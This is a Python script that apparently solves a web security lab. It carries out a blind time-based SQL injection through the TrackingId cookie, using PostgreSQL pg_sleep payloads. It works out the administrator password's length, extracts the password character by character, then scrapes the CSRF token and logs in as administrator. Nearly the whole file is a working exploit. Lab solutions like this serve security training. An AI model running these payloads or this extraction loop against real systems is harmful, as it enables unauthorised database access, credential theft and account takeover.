from ...utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import requests
import string
import time


def solve_lab(url, proxies):
    print_info(
        f'Determining the length of the administrator password by visiting "{url}" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
    )

    len_pass = 1
    while True:
        cookies = {
            "TrackingId": f"' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={len_pass}) THEN pg_sleep(10) ELSE pg_sleep(0) END --"
        }

        start = time.perf_counter()
        requests.get(url, proxies=proxies, verify=False, cookies=cookies)
        end = time.perf_counter()
        response_time = end - start

        if response_time < 10:
            print_info_secondary(f"{len_pass} => {response_time:.2f} seconds", end="")
            len_pass += 1
        else:
            print_success(f"{len_pass} => {response_time:.2f} seconds\n")
            break

    print_info(
        f'Determining administrator password by visting "{url}" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
    )
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""

    for i in range(len_pass):
        for c in alphabet:
            cookies = {
                "TrackingId": f"' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), {i+1}, 1)='{c}') THEN pg_sleep(10) ELSE pg_sleep(0) END --"
            }
            start = time.perf_counter()
            requests.get(url, proxies=proxies, verify=False, cookies=cookies)
            end = time.perf_counter()
            response_time = end - start

            if response_time < 10:
                print_info_secondary(
                    f"{i+1}, '{c}' => {response_time:.2f} | Progress: {password}...",
                    end="",
                )
            else:
                print_success(
                    f"{i+1}, '{c}' => {response_time:.1f} | Progress: {password}...",
                    end="",
                )
                password += c
                break
        else:
            print()
            print_fail(f"Unable to determine character at index {i}")

    print()
    print_success(f"Successfully extracted administrator password: {password}\n")

    url = urljoin(url, "/login")
    print_info(f'Grabbing CSRF value from "{url}"...')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")

    else:
        print_success(f"CSRF value: {csrf}\n")

    data = {"csrf": csrf, "username": "administrator", "password": password}
    print_info("Logging in with the following values:")
    print(data)

    resp = s.post(
        url,
        proxies=proxies,
        verify=False,
        data=data,
    )
    print_success("SQL injection attack performed.\n")
